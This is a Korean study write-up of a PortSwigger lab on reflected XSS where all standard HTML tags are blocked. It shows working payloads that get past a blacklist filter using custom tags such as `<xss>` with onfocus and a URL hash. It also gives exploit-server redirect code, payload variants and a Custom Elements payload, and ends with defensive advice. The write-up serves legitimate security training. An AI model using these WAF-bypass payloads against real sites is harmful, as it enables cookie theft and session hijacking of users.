# Lab: Reflected XSS with all tags blocked except custom ones

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / 사용자 정의 태그 / Custom Elements / `onfocus` + URL 해시
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked

## 목표

모든 표준 HTML 태그가 차단된 환경에서 사용자 정의(custom) 태그를 이용해 `alert(document.cookie)` 를 실행시킨다.

## 취약점 분석

이번 랩은 014 랩보다 강화된 WAF를 사용한다.

```
<script>        → 차단
<img>           → 차단
<svg>           → 차단
<body>          → 차단
<xss>           → 허용! (표준 태그가 아님)
<custom-tag>    → 허용!
```

**표준 HTML 태그는 모두 차단되지만, WAF가 알 수 없는 사용자 정의 태그는 통과한다.**

## 왜 사용자 정의 태그가 허용되는가

### 브라우저 호환성 정책

HTML 표준은 **미래 호환성(forward compatibility)** 을 위해 알 수 없는 태그를 오류로 처리하지 않고 `HTMLUnknownElement` 로 파싱한다.

```javascript
// 브라우저가 <xss> 를 만나면
document.createElement('xss')  → HTMLElement 를 상속한 일반 요소로 생성
// 렌더링은 인라인 요소처럼 처리
// 모든 표준 HTML 속성(이벤트 핸들러 포함)이 동작
```

즉, `<xss>`, `<foo>`, `<custom-tag>` 같은 태그도:
- `id`, `class`, `style` 속성 사용 가능
- `onfocus`, `onmouseover`, `onclick` 등 **모든 이벤트 핸들러 사용 가능**
- `tabindex` 속성으로 포커스 가능하게 설정 가능

### Web Components 표준

HTML5의 Custom Elements API 는 사용자 정의 태그를 공식 지원한다.

```javascript
// 사용자 정의 태그에 동작 연결
customElements.define('my-element', class extends HTMLElement {
    connectedCallback() {
        // DOM에 삽입될 때 자동 실행
        console.log('custom element connected');
    }
});
```

브라우저는 이런 사용자 정의 태그가 추후 정의될 수 있다고 가정하고 오류 없이 파싱한다.  
**WAF는 이 정책을 예측하지 못하면 사용자 정의 태그를 블랙리스트에 포함하지 않는다.**

## 공격 방법

### 페이로드

```
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```

- `<xss>` — 차단되지 않는 사용자 정의 태그
- `id=x` — URL 해시(`#x`)로 이 요소를 직접 지정하기 위한 ID
- `onfocus=alert(document.cookie)` — 포커스를 받을 때 실행
- `tabindex=1` — 키보드/해시로 포커스를 받을 수 있게 설정 (기본적으로 커스텀 태그는 포커스 불가)

### `onfocus` + URL 해시(`#x`) 자동 실행

브라우저는 URL의 `#id` 가 있으면 해당 `id` 를 가진 요소로 스크롤하고 **포커스**를 부여한다.

```
URL: /?search=<xss id=x onfocus=alert(1) tabindex=1>#x
                                                      ↑
                                              페이지 로드 후 id=x 요소에 포커스
                                              → onfocus 발화 → alert(1) 실행
```

피해자가 이 URL을 방문하는 순간 자동으로 실행된다.

### exploit server에서 피해자에게 전달

```html
<script>
location = 'https://[랩URL]/?search=<xss+id%3Dx+onfocus%3Dalert(document.cookie)+tabindex%3D1>#x';
</script>
```

`location` 을 직접 변경해 피해자 브라우저를 공격 URL로 리다이렉트한다.

URL 인코딩:
- `+` = 공백
- `%3D` = `=`
- `%28`, `%29` = `(`, `)`

## 014 랩과의 비교

| 항목 | 014 (onresize) | 015 (이번 랩) |
|------|---------------|--------------|
| WAF 강도 | 대부분 차단, 일부 허용 | **모든 표준 태그 차단** |
| 우회 방법 | 허용된 표준 태그 탐색 | 사용자 정의 태그 사용 |
| 사용 태그 | `<body>` | `<xss>` (비표준) |
| 사용 이벤트 | `onresize` | `onfocus` |
| 이벤트 유발 | iframe 크기 변경 | URL 해시 `#id` 로 포커스 |
| exploit 전달 | iframe | `location` 리다이렉트 |

## 핵심 정리

- 브라우저 호환성 정책으로 사용자 정의 태그는 표준 HTML 속성·이벤트를 모두 지원한다.
- WAF 블랙리스트는 알려진 표준 태그만 차단하므로 `<xss>`, `<foo>` 같은 비표준 태그는 통과한다.
- `tabindex` 로 포커스 가능하게 만들고, URL 해시 `#id` 로 페이지 로드 시 자동 포커스를 유발한다.
- 이벤트 핸들러(`onfocus`, `onmouseover` 등)는 태그 종류와 무관하게 동작한다.
- **방어**: 화이트리스트 방식으로 허용 태그만 명시, 사용자 입력에 HTML 태그 자체를 허용하지 않음, CSP 적용.

## 배운 점 및 추가 학습

### 1. 사용자 정의 태그와 이벤트 핸들러

이벤트 핸들러 속성(`on*`)은 HTML 스펙에서 **전역 속성(global attributes)** 으로 정의되어, 모든 HTML 요소(표준·비표준 모두)에서 동작한다.

```html
<!-- 표준 태그 -->
<div onfocus=alert(1) tabindex=1>클릭</div>

<!-- 사용자 정의 태그 — 완전히 동일하게 동작 -->
<xss onfocus=alert(1) tabindex=1>클릭</xss>
<foo onfocus=alert(1) tabindex=1>클릭</foo>
<anything onfocus=alert(1) tabindex=1>클릭</anything>
```

### 2. `tabindex` 의 역할

기본적으로 포커스를 받을 수 있는 요소: `<input>`, `<button>`, `<a href>`, `<select>`, `<textarea>`

`tabindex` 속성으로 임의의 요소를 포커스 가능하게 만들 수 있다.

```html
tabindex="-1"  → 프로그래밍적으로만 포커스 가능 (Tab 키 X)
tabindex="0"   → Tab 순서에 포함 (문서 순서대로)
tabindex="1"   → Tab 순서에서 우선순위 1 (양수값은 먼저 포커스)
```

URL 해시 `#id` 로 포커스를 유발하려면 `tabindex` 가 반드시 필요하다.

### 3. URL 해시와 포커스 동작

```
https://example.com/page#section1

브라우저 동작:
1. 페이지 로드
2. id="section1" 인 요소를 찾음
3. 해당 요소로 스크롤
4. 요소가 포커스 가능하면 (tabindex 포함) 포커스 부여
   → onfocus 이벤트 발화
```

이 동작은 원래 앵커 링크(`<a name="section">`)의 동작에서 유래했으며, XSS에서 자동 실행 유발에 활용된다.

### 4. 사용자 정의 태그 XSS 페이로드 변형

```html
<!-- 기본 — onfocus + tabindex + id -->
<xss id=x onfocus=alert(1) tabindex=1>

<!-- 마우스 오버 (tabindex 불필요) -->
<xss onmouseover=alert(1)>마우스 오버</xss>

<!-- onmouseenter -->
<xss onmouseenter=alert(1)>진입</xss>

<!-- onclick -->
<xss onclick=alert(1)>클릭</xss>

<!-- style 속성 + 애니메이션 이벤트 -->
<xss style="animation:x 1s" onanimationstart=alert(1)>애니</xss>

<!-- autofocus 가 지원되는 경우 (브라우저 따라 다름) -->
<xss autofocus onfocus=alert(1)>
```

### 5. Custom Elements API와 `connectedCallback`

`<script>` 태그가 허용되는 환경에서는 Custom Elements의 라이프사이클 콜백을 활용할 수 있다.

```javascript
// connectedCallback — 요소가 DOM에 삽입될 때 자동 실행
customElements.define('xss-el', class extends HTMLElement {
    connectedCallback() {
        alert(document.cookie);  // DOM 삽입 즉시 실행
    }
});
```

```html
<!-- script 허용 환경 -->
<script>customElements.define('x-x',class extends HTMLElement{connectedCallback(){alert(1)}})</script>
<x-x>
```

DOM에 `<x-x>` 가 삽입되는 순간 `connectedCallback` 이 발화하므로 사용자 상호작용이 전혀 불필요하다.  
이번 랩에서 `<script>` 는 차단되었지만, 이 원리를 확인했다면 Custom Elements의 DOM 생명주기를 이해한 것이다.

### 6. WAF 우회 수준별 정리 (014 → 015)

```
수준 1: 기본 XSS 차단
  <script>, <img onerror>, <svg onload> 차단
  → 덜 알려진 태그/이벤트 탐색 (014 랩)

수준 2: 모든 표준 태그 차단
  모든 표준 HTML 태그 차단
  → 사용자 정의 태그 우회 (015 랩)

수준 3: 화이트리스트 방식
  허용 태그만 명시 (예: <p>, <b>, <i>)
  나머지 모두 제거
  → 이론상 XSS 불가 (단, 허용된 태그의 속성 처리까지 완벽해야 함)
```
